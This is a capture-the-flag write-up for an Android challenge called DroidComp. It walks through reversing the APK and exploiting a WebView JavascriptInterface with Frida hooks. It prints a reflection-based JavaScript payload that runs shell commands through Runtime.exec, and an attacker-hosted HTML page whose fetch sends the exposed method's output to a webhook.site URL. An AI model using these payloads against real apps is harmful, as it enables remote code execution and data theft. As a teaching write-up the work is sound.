---
title: DroidComp writeup
date: 2023-01-22 18:00:00 +0200
categories: [Writeup, android, APK, reversing, frida]
tags: [android, apk, reversing, frida]     # TAG names should always be lowercase
img_path: /assets/img/ctf/bios/droidcomp
image: # Thumbnail 
  src: Frida.jpg
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Summary
This challenge focuses on reverse engineering an APK that uses a function with a vulnerable `webView` object. We can use this object and the `JavascriptInterface` bound to it to execute one specific function, which just so happens to return the flag. 


## Introduction
We are given an `.apk` file and the challenge description: "Here is the APK file. Get the flag by exploiting the vulnerabilities."

Overall, not a lot to go off of. We start out by decoding the given APK and taking a look at the `AndroidManifest.xml` file:

```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="32" android:compileSdkVersionCodename="12" package="x.y.z" platformBuildVersionCode="32" platformBuildVersionName="12">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.STORAGE"/>
    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules" android:fullBackupContent="@xml/backup_rules" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/Theme.Abc">
        <service android:enabled="true" android:exported="true" android:name="x.y.z.IService" android:process=":remote">
            <intent-filter>
                <action android:name="x.y.z.ServicesOut"/>
            </intent-filter>
        </service>
        <activity android:exported="true" android:name="x.y.z.a">
            <meta-data android:name="android.app.lib_name" android:value=""/>
            <intent-filter>
                <action android:name="android.intent.action.CUSTOM_INTENT"/>
                <data android:host="bi0s" android:scheme="android"/>
            </intent-filter>
        </activity>
        <activity android:exported="true" android:name="x.y.z.m">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <meta-data android:name="android.app.lib_name" android:value=""/>
        </activity>
        <provider android:authorities="x.y.z.androidx-startup" android:exported="false" android:name="androidx.startup.InitializationProvider">
            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
        </provider>
    </application>
</manifest>
```
We can tell that the main activity that is being launched when the app is opened on the phone is named `x.y.z.m`. Decompiling the `APK` with jadx we get the following source code:

```java
package x.y.z;  
  
import android.content.Intent;  
import android.os.Bundle;  
import android.view.View;  
import android.widget.ImageButton;  
import androidx.appcompat.app.AppCompatActivity;  
  
/* loaded from: classes.dex */  
public class m extends AppCompatActivity {  
    /* JADX INFO: Access modifiers changed from: protected */  
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity  
    public void onCreate(Bundle bundle) {  
        super.onCreate(bundle);  
        setContentView(R.layout.activity_m);  
        ((ImageButton) findViewById(R.id.btn)).setOnClickListener(new View.OnClickListener() { // from class: x.y.z.m$$ExternalSyntheticLambda0  
            @Override // android.view.View.OnClickListener  
            public final void onClick(View view) {  
                m.this.m2016lambda$onCreate$0$xyzm(view);  
            }  
        });  
    }  
  
    /* JADX INFO: Access modifiers changed from: package-private */  
    /* renamed from: lambda$onCreate$0$x-y-z-m  reason: not valid java name */  
    public /* synthetic */ void m2016lambda$onCreate$0$xyzm(View view) {  
        startActivity(new Intent(this, a.class));  
    }  
}
```

Basically, all this code does is create a button, and setting the button's `onClick` method to launch a new intent, targeting the `x.y.z.a` class which can be seen below:

```java
public class a extends AppCompatActivity {  
    static final /* synthetic */ boolean $assertionsDisabled = false;  
  
    /* JADX INFO: Access modifiers changed from: protected */  
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity  
    public void onCreate(Bundle bundle) {  
        super.onCreate(bundle);  
        setContentView(R.layout.activity_a);  
        WebView webView = (WebView) findViewById(R.id.webView);  
        boolean z = true;  
        webView.getSettings().setJavaScriptEnabled(true);  
        webView.addJavascriptInterface(new c(this), "client");  
        webView.getSettings().getAllowFileAccess();  
        webView.getSettings().getAllowContentAccess();  
        webView.getSettings().getAllowUniversalAccessFromFileURLs();  
        webView.getSettings().getDomStorageEnabled();  
        webView.getSettings().setUseWideViewPort(true);  
        webView.getSettings().setAppCacheEnabled(true);  
        webView.getSettings().setAllowFileAccess(true);  
        Intent intent = getIntent();  
        if (intent == null) {  
            webView.loadUrl("https://google.com");  
        }  
        Uri data = intent.getData();  
        if (data != null) {  
            String queryParameter = data.getQueryParameter("web");  
            Log.d("TAG", "onCreate: " + queryParameter);  
            if (queryParameter == null) {  
                z = false;  
            }  
            if (z & URLUtil.isValidUrl(queryParameter)) {  
                webView.loadUrl(queryParameter);  
                return;  
            } else if (!queryParameter.contains("html")) {  
                return;  
            } else {  
                webView.loadUrl(queryParameter);  
                return;  
            }  
        }  
        webView.loadUrl("https://google.com");  
    }  
}
```

This is basically the meat of the challenge. The `onCreate` method creates a `webView` object, adds a `JavascriptInterface` to it, and then sets a bunch of options for the `webview`. If we had a remote instance that we needed to attack then it would probably be interesting to see if we could use the `setAllowFileAccess` option into path traversal, however since we only have the instance running locally we won't bother with that.

The method then checks if the intent contains any data, and if it does, and that data contains a `queryParameter` with the value "web" it will load that page via the `webView`. 

## The webView object and why it can totally ruin your day

The reason that the `webView` object has Javascript disabled by default is that it can very quickly lead to `RCE` if the user visits a malicious site via the `webView`. 

Let's say that the application has created a `webView` object, assigned a `JavascriptInterface` to it, and it then visits a site with the following content:

```html
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
  return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```

And that is all there is to getting `RCE`. For this reason it's not recommended to use a `JavascriptInterface` with webViews unless completely necessary. There are some precautions however. For example, the application could use the `@JavascriptInterface` annotation to only allow the interface to only expose specific methods, which is actually what is happening in this challenge. 

```java
package x.y.z;  
  
import android.webkit.JavascriptInterface;  
  
/* loaded from: classes.dex */  
public class c {  
    public c(a aVar) {  
    }  
  
    @JavascriptInterface  
    public String d() {  
        return new h().s(BuildConfig.APPLICATION_ID);  
    }  
}
```

And here is the content of the `h` class:

```java
public final class h {  
    public static final Companion Companion = new Companion(null);  
  
    public final native String s(String str);  
  
    public final native String ss(String str);  
    /* loaded from: classes.dex */  
    public static final class Companion {  
        public /* synthetic */ Companion(DefaultConstructorMarker defaultConstructorMarker) {  
            this();  
        }  
  
        private Companion() {  
        }  
    }  
  
    static {  
        System.loadLibrary("o");  
    }  
}
```

As we can see, we only have access to the `d` method of the `JavascriptInterface` named client. Let's use `Frida` to get the application to visit a URL of our choice, and then put some malicious Javascript on it.

Since no data is supplied with the intent, we first need to hook the `getData()` function, so that it returns a URI with a queryParameter named "web", which will contain our URL. The frida script used for this can be seen below:

```js
Java.perform(function () {
	var Intent = Java.use('android.content.Intent');
	Intent.getData.overload().implementation = function() {
		console.log("-------------------HOOKED getData-----------------");

		var UriBuilder = Java.use('android.net.Uri$Builder');
		var UriBuilderInstance = UriBuilder.$new();
		var String = Java.use('java.lang.String');
		var str1 = String.$new("https://something-here.eu.ngrok.io/test.html");
		var strKey = String.$new("web")
		UriBuilderInstance.appendQueryParameter(strKey,str1);
		var uri = UriBuilderInstance.build();

		console.log(uri.toString());
		console.log(uri.getQueryParameter("web"));
		
        var result = this.getData();

		console.log(result);
		console.log(uri.getQueryParameter("web"));

		return uri;
	
	};
});
```

And the HTML for the site hosted via `ngrok` can be found below:

```html
<!-- client is the name of the Android exposed object -->
HELLO WORLD
<script>
fetch(`https://webhook.site/your-webhook-here?msg=${btoa(JSON.stringify(client.d()))}`);;;
</script>
```

My teammate found this way of getting the result of the `d` function. Since the `d` function returns a string we can simply call the function, Stringify it and convert it to base64 before visiting our webhook with the data in the url parameter "msg".

This is done to simplify the solving process slightly, as the `h.s()`  being returned in `d` is a native function, which would mean that normally we would have to find and reverse engineer the function found in `libo.so` to find out what it actually does or returns.

We view the site in the app on our emulator, and on the webhook we get the following a lookup with the following query string:
`msg=ImJpMHNDVEZ7NG5kcjAxZF8xNSI=`, which decodes to `"bi0sCTF{4ndr01d_15"`, the first part of the flag!

Getting the second part of the flag is trivial at this point. We simply hook the `h.s()` method called implicitly via our `JavascriptInterface` to return `h.ss()` instead. We then have the following frida script:
```js
Java.perform(function () {
	var Intent = Java.use('android.content.Intent');
	Intent.getData.overload().implementation = function() {
		console.log("-------------------HOOKED getData-----------------");

		var UriBuilder = Java.use('android.net.Uri$Builder');
		var UriBuilderInstance = UriBuilder.$new();
		var String = Java.use('java.lang.String');
		var str1 = String.$new("https://something-here.eu.ngrok.io/test.html");
		var strKey = String.$new("web")
		UriBuilderInstance.appendQueryParameter(strKey,str1);
		var uri = UriBuilderInstance.build();

		console.log(uri.toString());
		console.log(uri.getQueryParameter("web"));
		
        var result = this.getData();

		console.log(result);
		console.log(uri.getQueryParameter("web"));

		return uri;
	
	};

	var H = Java.use('x.y.z.h');	
	H.s.overload("java.lang.String").implementation = function(arg1) {
		console.log("-------------------HOOKED s-----------------");
		console.log("The input arg1 is " + arg1);
		return H.$new().ss(arg1);
	};
});
```

We then get the final part of the flag: `"bi0sCTF{4ndr01d_15_50_vuln3r4bl3}"`